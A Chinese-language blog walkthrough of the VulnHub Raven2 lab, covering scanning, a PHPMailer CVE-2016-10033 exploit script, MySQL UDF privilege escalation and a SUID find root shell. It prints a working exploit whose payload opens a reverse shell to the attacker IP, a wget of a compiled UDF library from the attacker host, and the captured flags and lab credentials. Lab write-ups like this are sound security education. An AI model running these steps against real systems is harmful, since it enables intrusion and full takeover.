---
title: "vulnhub靶机渗透RAVEN2"
onlyTitle: true
date: 2023-06-28 13:05:36
categories:
- 内网渗透
- 靶机
tags:
- 内网渗透
- vulnhub
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B877.png
---

| 资产编号 | 资产分类 | 资产名称       | 资产规格                                                 | 访问地址        | 备注/问题                                                   |
| -------- | -------- | -------------- | -------------------------------------------------------- | --------------- | ----------------------------------------------------------- |
| RAVEN1   | 主机系统 | Ubuntu操作系统 | Type:Linux<br />IP:192.168.101.134<br />Port:22、80、111 | 192.168.101.134 | 敏感目录泄露，PHPMailer低版本参数注入漏洞，UDF+find命令提权 |

靶机flag:

==flag1{b9bbcb33e11b80be759c4e844862482d}==

==flag2{6a8ed560f0b5358ecf844108048eb337}==

==flag3{a0f568aa9de277887f37730d71520d9b}==

==flag4{df2bc5e951d91581467bb9a2a8ff4425}==



靶机下载地址：https://download.vulnhub.com/raven/Raven2.ova

kali攻击机ip为192.168.101.128

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230624215915330.png)

### RAVEN 2靶机

### （1）信息收集

* 通过netdiscover进行二层发现，发现地址为192.168.101.134主机

```sh
netdiscover -r 192.168.101.0/24
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626102437077.png)

* 通过ping进行三层发现，根据ttl=64初步推测该主机为Linux

```sh
ping 192.168.101.134
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626102542459.png)

* 通过masscan四层发现目标主机开放端口

```sh
masscan -p0-65535 --rate=10000 192.168.101.134
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626102724962.png)

目标主机开启了111服务端口，22ssh端口，49505端口



* 扫描目标端口服务

  ```sh
  nmap -A -p- -sC -T4 -sS -P0 192.168.101.134 -oN nmap.A
  ```


![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626102846814.png)

* 目标开启了以下端口及服务：
  * 22端口，服务为OpenSSH 6.7p1;且系统为Debian 5+deb8u4
  * 80端口，服务为Apacha 2.4.10
  * 111端口，rpcbind服务



使用Nmap中漏洞分类NSE脚本对目标进行探测

```sh
nmap -sV --script vuln 192.168.101.134
```

****

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626103151599.png)

同样存在openssh的用户名枚举和栈溢出的SSV-90447可用



在exploit-db上搜索ssh对应版本的漏洞，或者searchspolit，目标服务器的openssh有用户名枚举漏洞

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625210618990.png)



seebug上看到目标主机存在信息泄露和缓冲区溢出漏洞，还有2010年的拒绝服务漏洞（因该漏洞等级较低，实施拒绝服务也较困难所以无视）

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214035684.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214249208.png)

==192.168.101.134主机的22端口存在信息泄露和缓冲区溢出漏洞，seebug还有searchspolit都能找到对应的poc，该轮信息扫描可以用来进行下一步的ssh爆破或溢出漏洞攻击。该信息泄露漏洞定义为中危==

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214826294.png)

访问其web服务：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142536853.png)

在其service.html源码里找到flag1:

==flag1{b9bbcb33e11b80be759c4e844862482d}==

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626151243145.png)



* 目录扫描：

```sh
dirb 192.168.101.135
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142852924.png)

目标网站存在vendor目录，访问一下，发现存在敏感目录遍历

> vendor目录一般是指在项目中用于存放第三方库、框架、插件等外部依赖的目录。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626143148450.png)



还有wordpress目录，该站应该是一个wordpress的框架

* wappalzer分析：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626143024979.png)



在目录可以看到使用了PHPMailer(功能齐全的PHP电子邮件创建和传输类)



VERSION目录找到了PHPMailer版本号为5.2.16

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626145333475.png)

### （2）PHPMailer漏洞攻击

查找对应的漏洞：

```sh
searchsploit PHPMailer
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626145538957.png)

PHPMaileer<5.2.18可以进行远程代码执行，使用python版对应的exp：

* 把exp复制到当前目录：

```sh
cp /usr/share/exploitdb/exploits/php/webapps/40974.py ./
```

* 攻击机kali开启nc监听，端口为4444

```bash
nc -lvnp 4444
```

* 修改exp，把target改为目标地址，backdoor为写的shell地址，修改反弹shell地址为本机ip，修改后如下：

  

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628192523424.png)



之所以加contact.php，可以看一下该漏洞成因，是因为输入的邮件地址能包含引号括起来的空格，造成参数注入。所以要找接收邮件参数的页面。就是contact.php

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628192319281.png)

```py
from requests_toolbelt import MultipartEncoder
import requests
import os
import base64
from lxml import html as lh

os.system('clear')
print("\n")
print(" █████╗ ███╗   ██╗ █████╗ ██████╗  ██████╗ ██████╗ ██████╗ ███████╗██████╗ ")
print("██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗")
print("███████║██╔██╗ ██║███████║██████╔╝██║     ██║   ██║██║  ██║█████╗  ██████╔╝")
print("██╔══██║██║╚██╗██║██╔══██║██╔══██╗██║     ██║   ██║██║  ██║██╔══╝  ██╔══██╗")
print("██║  ██║██║ ╚████║██║  ██║██║  ██║╚██████╗╚██████╔╝██████╔╝███████╗██║  ██║")
print("╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝")
print("      PHPMailer Exploit CVE 2016-10033 - anarcoder at protonmail.com")
print(" Version 1.0 - github.com/anarcoder - greetings opsxcq & David Golunski\n")

target = 'http://192.168.101.134:80/contact.php'#存在漏洞的目标
backdoor = '/godown.php'#后门位置

payload = '<?php system(\'python -c """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\'192.168.101.128\\\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])"""\'); ?>'#connect到kali ip
fields={'action': 'submit',
        'name': payload,
        'email': '"anarcoder\\\" -OQueueDirectory=/tmp -X/var/www/html/godown.php server\" @protonmail.com',
        'message': 'Pwned'}#OQueueDirectory同步改为shell地址

m = MultipartEncoder(fields=fields,
                     boundary='----WebKitFormBoundaryzXJpHSq4mNy35tHe')

headers={'User-Agent': 'curl/7.47.0',
         'Content-Type': m.content_type}

proxies = {'http': 'localhost:8081', 'https':'localhost:8081'}


print('[+] SeNdiNG eVIl SHeLL To TaRGeT....')
r = requests.post(target, data=m.to_string(),
                  headers=headers)
print('[+] SPaWNiNG eVIL sHeLL..... bOOOOM :D')
r = requests.get(target+backdoor, headers=headers)
if r.status_code == 200:
    print('[+]  ExPLoITeD ' + target)
```

> 提一些其他的知识：vim全选复制：vVGy
>
> v进入普通可视模式，V进入行可视模式，G把光标易懂到最后一行，y复制选中文本





执行后显示如下结果：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628191222883.png)

现在访问http://192.168.101.134/godown.php（你所写shell位置），弹回shell

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628191342876.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628191357449.png)

shell为www-data的权限：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628191418321.png)



目标机有python环境

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628193135591.png)

* 用python pty获取完整交互式shell

```sh
python -c 'import pty; pty.spawn("/bin/bash")'
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628193203637.png)



查找flag2，flag3:

```sh
find / -name flag* 2>/dev/null
```

> 加上`2>/dev/null`把错误输出丢弃，不然会出现暴多Permission denied的无权限搜索目录信息。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628193757457.png)



flag2:==flag2{6a8ed560f0b5358ecf844108048eb337}==

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628193853770.png)



flag3:网页上查看

==flag3{a0f568aa9de277887f37730d71520d9b}==

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628194012468.png)



### （3）Mysql UDF提权

wordpress下有wordpress的配置文件wp-config.php

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628194359329.png)

数据库账号root，密码R@v3nSecurity

登录mysql:

```sh
mysql -u root -pR@v3nSecurity
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628194517437.png)

且Server version(Mysql)版本为5.5.60。可以用udf提权

> udf提权：UDF提权前提是知道数据库root密码
>
> * 一般来说mysql>=5.1.4 上传udf到mysql\lib\plugin
> * 如果mysql<5.1.4 别想了，遇不到



查找对应的exp：

```sh
searchsploit mysql
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628200305919.png)

把exp复制到当前路径，并gcc编译

```bash
cp /usr/share/exploitdb/exploits/linux/local/1518.c ./
gcc -g -c 1518.c
gcc -g -shared -o  raptor_udf.so 1518.o -lc
```

> gcc各个参数说明：
>
> -g 生成调试信息
>
> -shared 生成动态链接库(.so)而不是可执行文件。用以在各个程序共享
>
> -o 输出文件 1518.o输入文件
>
> -lc 连接c标准库，提供标准C库函数支持



在kali上起一个web服务，在靶机上下载so

```sh
python3 -m http.server 8888
或者
python2 -m SimpleHTTPServer 8888
```

靶机执行：

```sh
wget http://192.168.101.128:8888/raptor_udf.so
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628201426533.png)



![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628201724809.png)

进入数据库mysql创建数据表foo，向表中插入二进制数据，利用dumpfile函数把文件以root权限写到plugin目录，新建返回类型为整型的函数do_system，别名soname（注意修改load_file的so路径）

```sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/var/www/html/raptor_udf1.so'));
select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf.so';
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628211948175.png)



* find提权

通过do_system函数给find目录所有者的suid权限

```bash
select do_system('chmod u+s /usr/bin/find');
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628212040242.png)

```bash
touch finn
find finn -exec "/bin/sh" \;
```

完成！看到shell标识变了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628212226260.png)

uid为root

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628212254283.png)



在root下找到最后一个flag:==flag4{df2bc5e951d91581467bb9a2a8ff4425}==

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628212404358.png)